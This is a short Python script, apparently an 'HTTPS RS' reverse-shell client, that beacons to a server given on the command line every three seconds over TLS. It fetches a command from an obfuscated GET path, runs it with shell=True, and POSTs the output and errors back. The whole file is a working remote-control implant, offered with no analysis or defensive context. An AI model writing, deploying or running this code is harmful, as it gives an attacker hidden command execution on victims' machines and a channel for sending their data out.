import subprocess
import socket
import ssl
import argparse
import time
import json

argument_parser = argparse.ArgumentParser(description='HTTPS RS')
argument_parser.add_argument("-p", "--port", help='Server port', type=int, required=True)
argument_parser.add_argument("-t", "--target", help='Server hostname', type=str, required=True)
args = vars(argument_parser.parse_args())

HOST = args["target"]
PORT = args["port"]
interval = 3 # seconds

context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.check_hostname = False

def command_get(sock):
    heartbeat_get = b""
    heartbeat_get += b"GET /YXNmYXNkZnNk HTTP/1.1\r\n"
    heartbeat_get += "Host: {}\r\n".format(HOST).encode("utf-8")
    heartbeat_get += b"Accept: */*\r\n"
    heartbeat_get += b"\r\n"
    sock.send(heartbeat_get)

def output_post(sock, payload):
    cmd_post = b""
    cmd_post += b"POST /dmJ2YnZiZGZh HTTP/1.1\r\n"
    cmd_post += "Host: {}\r\n".format(HOST).encode("utf-8")
    cmd_post += b"Accept: */*\r\n"
    cmd_post += "Content-Length: {}\r\n".format(len(payload)).encode("utf-8")
    cmd_post += b"Content-Type: application/json\r\n"
    cmd_post += b"\r\n"
    cmd_post += payload
    sock.send(cmd_post)

while True:
    print("Heartbeat", time.strftime("%H:%M:%S",time.localtime()))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = context.wrap_socket(sock)
    wrappedSocket.connect((HOST, PORT))

    command_get(wrappedSocket)
    get_resp = wrappedSocket.recv()
    wrappedSocket.close()

    head, body = get_resp.split(b"\r\n\r\n", 1)

    if body:
        print(body)
        json_obj = json.loads(body)
        command = json_obj.get("com")

        if command:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            output_bytes = cmd.stdout.read()
            error_bytes = cmd.stderr.read()

            output_str = output_bytes.decode('utf-8')
            error_str = error_bytes.decode('utf-8')

            body = { "com" : command, "output" : output_str, "error" : error_str }
            payload = json.dumps(body).encode("utf-8")
            print(payload)

            sock_response = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            wrappedSocket_response = context.wrap_socket(sock_response)
            wrappedSocket_response.connect((HOST, PORT))

            output_post(wrappedSocket_response, payload)

            wrappedSocket_response.close()

    time.sleep(interval)